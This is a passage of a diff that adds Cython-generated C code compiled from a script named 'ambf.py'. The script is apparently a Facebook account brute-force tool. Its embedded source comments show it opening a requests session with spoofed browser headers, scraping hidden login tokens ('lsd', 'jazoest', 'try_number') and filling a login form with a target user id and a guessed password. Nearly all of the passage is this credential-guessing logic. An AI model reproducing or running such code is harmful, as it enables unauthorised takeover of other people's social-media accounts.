+    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_Session); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 484, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    __pyx_t_11 = NULL;
+    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
+      __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
+      if (likely(__pyx_t_11)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
+        __Pyx_INCREF(__pyx_t_11);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_12, function);
+      }
+    }
+    __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
+    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 484, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_6);
+    __pyx_t_6 = 0;
+
+    /* "ambf.py":485
+ * 		pw = pw.lower()
+ * 		ses = requests.Session()
+ * 		ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})             # <<<<<<<<<<<<<<
+ * 		p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
+ * 		b = parser(p,"html.parser")
+ */
+    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_update); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    __pyx_t_12 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_origin, __pyx_v_host) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_bs4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_8);
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_re); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_4);
+    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_findall); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_8);
+    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
+    __pyx_t_4 = NULL;
+    __pyx_t_7 = 0;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
+      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_8);
+      if (likely(__pyx_t_4)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
+        __Pyx_INCREF(__pyx_t_4);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_8, function);
+        __pyx_t_7 = 1;
+      }
+    }
+    #if CYTHON_FAST_PYCALL
+    if (PyFunction_Check(__pyx_t_8)) {
+      PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_kp_s__46, __pyx_v_host};
+      __pyx_t_10 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 485, __pyx_L1_error)
+      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
+      __Pyx_GOTREF(__pyx_t_10);
+    } else
+    #endif
+    #if CYTHON_FAST_PYCCALL
+    if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
+      PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_kp_s__46, __pyx_v_host};
+      __pyx_t_10 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 485, __pyx_L1_error)
+      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
+      __Pyx_GOTREF(__pyx_t_10);
+    } else
+    #endif
+    {
+      __pyx_t_14 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 485, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_14);
+      if (__pyx_t_4) {
+        __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_4); __pyx_t_4 = NULL;
+      }
+      __Pyx_INCREF(__pyx_kp_s__46);
+      __Pyx_GIVEREF(__pyx_kp_s__46);
+      PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_7, __pyx_kp_s__46);
+      __Pyx_INCREF(__pyx_v_host);
+      __Pyx_GIVEREF(__pyx_v_host);
+      PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_7, __pyx_v_host);
+      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_14, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 485, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_10);
+      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
+    }
+    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+    __pyx_t_8 = __Pyx_PyString_Join(__pyx_kp_s__7, __pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_8);
+    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+    if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_Host, __pyx_t_8) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+    __pyx_t_8 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_8);
+    if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_referer, __pyx_t_8) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+    if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 485, __pyx_L1_error)
+    __pyx_t_8 = NULL;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
+      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
+      if (likely(__pyx_t_8)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
+        __Pyx_INCREF(__pyx_t_8);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_11, function);
+      }
+    }
+    __pyx_t_6 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_8, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_12);
+    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 485, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+
+    /* "ambf.py":486
+ * 		ses = requests.Session()
+ * 		ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+ * 		p = ses.get(host+"/login/?next&ref=dbl&refid=8").text             # <<<<<<<<<<<<<<
+ * 		b = parser(p,"html.parser")
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+ */
+    __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 486, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __pyx_t_12 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_refid_8); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 486, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __pyx_t_8 = NULL;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
+      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
+      if (likely(__pyx_t_8)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
+        __Pyx_INCREF(__pyx_t_8);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_11, function);
+      }
+    }
+    __pyx_t_6 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_8, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_12);
+    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 486, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_text); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 486, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+    __Pyx_XDECREF_SET(__pyx_v_p, __pyx_t_11);
+    __pyx_t_11 = 0;
+
+    /* "ambf.py":487
+ * 		ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+ * 		p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
+ * 		b = parser(p,"html.parser")             # <<<<<<<<<<<<<<
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+ * 		for i in b("input"):
+ */
+    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_parser); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 487, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __pyx_t_12 = NULL;
+    __pyx_t_7 = 0;
+    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
+      __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_6);
+      if (likely(__pyx_t_12)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
+        __Pyx_INCREF(__pyx_t_12);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_6, function);
+        __pyx_t_7 = 1;
+      }
+    }
+    #if CYTHON_FAST_PYCALL
+    if (PyFunction_Check(__pyx_t_6)) {
+      PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_v_p, __pyx_kp_s_html_parser};
+      __pyx_t_11 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 487, __pyx_L1_error)
+      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+      __Pyx_GOTREF(__pyx_t_11);
+    } else
+    #endif
+    #if CYTHON_FAST_PYCCALL
+    if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
+      PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_v_p, __pyx_kp_s_html_parser};
+      __pyx_t_11 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 487, __pyx_L1_error)
+      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+      __Pyx_GOTREF(__pyx_t_11);
+    } else
+    #endif
+    {
+      __pyx_t_8 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 487, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_8);
+      if (__pyx_t_12) {
+        __Pyx_GIVEREF(__pyx_t_12); PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_12); __pyx_t_12 = NULL;
+      }
+      __Pyx_INCREF(__pyx_v_p);
+      __Pyx_GIVEREF(__pyx_v_p);
+      PyTuple_SET_ITEM(__pyx_t_8, 0+__pyx_t_7, __pyx_v_p);
+      __Pyx_INCREF(__pyx_kp_s_html_parser);
+      __Pyx_GIVEREF(__pyx_kp_s_html_parser);
+      PyTuple_SET_ITEM(__pyx_t_8, 1+__pyx_t_7, __pyx_kp_s_html_parser);
+      __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_8, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 487, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+    }
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+    __Pyx_XDECREF_SET(__pyx_v_b, __pyx_t_11);
+    __pyx_t_11 = 0;
+
+    /* "ambf.py":488
+ * 		p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
+ * 		b = parser(p,"html.parser")
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]             # <<<<<<<<<<<<<<
+ * 		for i in b("input"):
+ * 			try:
+ */
+    __pyx_t_11 = PyList_New(7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 488, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __Pyx_INCREF(__pyx_n_s_lsd);
+    __Pyx_GIVEREF(__pyx_n_s_lsd);
+    PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_s_lsd);
+    __Pyx_INCREF(__pyx_n_s_jazoest);
+    __Pyx_GIVEREF(__pyx_n_s_jazoest);
+    PyList_SET_ITEM(__pyx_t_11, 1, __pyx_n_s_jazoest);
+    __Pyx_INCREF(__pyx_n_s_m_ts);
+    __Pyx_GIVEREF(__pyx_n_s_m_ts);
+    PyList_SET_ITEM(__pyx_t_11, 2, __pyx_n_s_m_ts);
+    __Pyx_INCREF(__pyx_n_s_li);
+    __Pyx_GIVEREF(__pyx_n_s_li);
+    PyList_SET_ITEM(__pyx_t_11, 3, __pyx_n_s_li);
+    __Pyx_INCREF(__pyx_n_s_try_number);
+    __Pyx_GIVEREF(__pyx_n_s_try_number);
+    PyList_SET_ITEM(__pyx_t_11, 4, __pyx_n_s_try_number);
+    __Pyx_INCREF(__pyx_n_s_unrecognized_tries);
+    __Pyx_GIVEREF(__pyx_n_s_unrecognized_tries);
+    PyList_SET_ITEM(__pyx_t_11, 5, __pyx_n_s_unrecognized_tries);
+    __Pyx_INCREF(__pyx_n_s_login);
+    __Pyx_GIVEREF(__pyx_n_s_login);
+    PyList_SET_ITEM(__pyx_t_11, 6, __pyx_n_s_login);
+    __Pyx_XDECREF_SET(__pyx_v_bl, ((PyObject*)__pyx_t_11));
+    __pyx_t_11 = 0;
+
+    /* "ambf.py":489
+ * 		b = parser(p,"html.parser")
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+ * 		for i in b("input"):             # <<<<<<<<<<<<<<
+ * 			try:
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+ */
+    __Pyx_INCREF(__pyx_v_b);
+    __pyx_t_6 = __pyx_v_b; __pyx_t_8 = NULL;
+    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
+      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
+      if (likely(__pyx_t_8)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
+        __Pyx_INCREF(__pyx_t_8);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_6, function);
+      }
+    }
+    __pyx_t_11 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_n_s_input) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_n_s_input);
+    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+    if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 489, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+    if (likely(PyList_CheckExact(__pyx_t_11)) || PyTuple_CheckExact(__pyx_t_11)) {
+      __pyx_t_6 = __pyx_t_11; __Pyx_INCREF(__pyx_t_6); __pyx_t_15 = 0;
+      __pyx_t_16 = NULL;
+    } else {
+      __pyx_t_15 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 489, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_6);
+      __pyx_t_16 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 489, __pyx_L1_error)
+    }
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    for (;;) {
+      if (likely(!__pyx_t_16)) {
+        if (likely(PyList_CheckExact(__pyx_t_6))) {
+          if (__pyx_t_15 >= PyList_GET_SIZE(__pyx_t_6)) break;
+          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
+          __pyx_t_11 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_15); __Pyx_INCREF(__pyx_t_11); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 489, __pyx_L1_error)
+          #else
+          __pyx_t_11 = PySequence_ITEM(__pyx_t_6, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 489, __pyx_L1_error)
+          __Pyx_GOTREF(__pyx_t_11);
+          #endif
+        } else {
+          if (__pyx_t_15 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
+          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
+          __pyx_t_11 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_15); __Pyx_INCREF(__pyx_t_11); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 489, __pyx_L1_error)
+          #else
+          __pyx_t_11 = PySequence_ITEM(__pyx_t_6, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 489, __pyx_L1_error)
+          __Pyx_GOTREF(__pyx_t_11);
+          #endif
+        }
+      } else {
+        __pyx_t_11 = __pyx_t_16(__pyx_t_6);
+        if (unlikely(!__pyx_t_11)) {
+          PyObject* exc_type = PyErr_Occurred();
+          if (exc_type) {
+            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
+            else __PYX_ERR(0, 489, __pyx_L1_error)
+          }
+          break;
+        }
+        __Pyx_GOTREF(__pyx_t_11);
+      }
+      __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_11);
+      __pyx_t_11 = 0;
+
+      /* "ambf.py":490
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+ * 		for i in b("input"):
+ * 			try:             # <<<<<<<<<<<<<<
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+ * 				else:continue
+ */
+      {
+        __Pyx_PyThreadState_declare
+        __Pyx_PyThreadState_assign
+        __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
+        __Pyx_XGOTREF(__pyx_t_3);
+        __Pyx_XGOTREF(__pyx_t_2);
+        __Pyx_XGOTREF(__pyx_t_1);
+        /*try:*/ {
+
+          /* "ambf.py":491
+ * 		for i in b("input"):
+ * 			try:
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})             # <<<<<<<<<<<<<<
+ * 				else:continue
+ * 			except:pass
+ */
+          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 491, __pyx_L15_error)
+          __Pyx_GOTREF(__pyx_t_8);
+          __pyx_t_12 = NULL;
+          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
+            __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_8);
+            if (likely(__pyx_t_12)) {
+              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
+              __Pyx_INCREF(__pyx_t_12);
+              __Pyx_INCREF(function);
+              __Pyx_DECREF_SET(__pyx_t_8, function);
+            }
+          }
+          __pyx_t_11 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_12, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_n_s_name);
+          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 491, __pyx_L15_error)
+          __Pyx_GOTREF(__pyx_t_11);
+          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+          __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_t_11, __pyx_v_bl, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 491, __pyx_L15_error)
+          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+          __pyx_t_18 = (__pyx_t_17 != 0);
+          if (__pyx_t_18) {
+            __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 491, __pyx_L15_error)
+            __Pyx_GOTREF(__pyx_t_11);
+            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 491, __pyx_L15_error)
+            __Pyx_GOTREF(__pyx_t_12);
+            __pyx_t_10 = NULL;
+            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
+              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
+              if (likely(__pyx_t_10)) {
+                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
+                __Pyx_INCREF(__pyx_t_10);
+                __Pyx_INCREF(function);
+                __Pyx_DECREF_SET(__pyx_t_12, function);
+              }
+            }
+            __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_n_s_name);
+            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
+            if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 491, __pyx_L15_error)
+            __Pyx_GOTREF(__pyx_t_8);
+            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 491, __pyx_L15_error)
+            __Pyx_GOTREF(__pyx_t_10);
+            __pyx_t_14 = NULL;
+            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+              __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
+              if (likely(__pyx_t_14)) {
+                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+                __Pyx_INCREF(__pyx_t_14);
+                __Pyx_INCREF(function);
+                __Pyx_DECREF_SET(__pyx_t_10, function);
+              }
+            }
+            __pyx_t_12 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_n_s_value) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_n_s_value);
+            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
+            if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 491, __pyx_L15_error)
+            __Pyx_GOTREF(__pyx_t_12);
+            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+            if (PyDict_SetItem(__pyx_t_11, __pyx_t_8, __pyx_t_12) < 0) __PYX_ERR(0, 491, __pyx_L15_error)
+            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+            __pyx_t_12 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 491, __pyx_L15_error)
+            __Pyx_GOTREF(__pyx_t_12);
+            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+            goto __pyx_L23;
+          }
+
+          /* "ambf.py":492
+ * 			try:
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+ * 				else:continue             # <<<<<<<<<<<<<<
+ * 			except:pass
+ * 		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+ */
+          /*else*/ {
+            goto __pyx_L21_try_continue;
+          }
+          __pyx_L23:;
+
+          /* "ambf.py":490
+ * 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+ * 		for i in b("input"):
+ * 			try:             # <<<<<<<<<<<<<<
+ * 				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+ * 				else:continue
+ */
+        }
+        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
+        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
+        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
+        goto __pyx_L22_try_end;
+        __pyx_L15_error:;
+        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
+        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
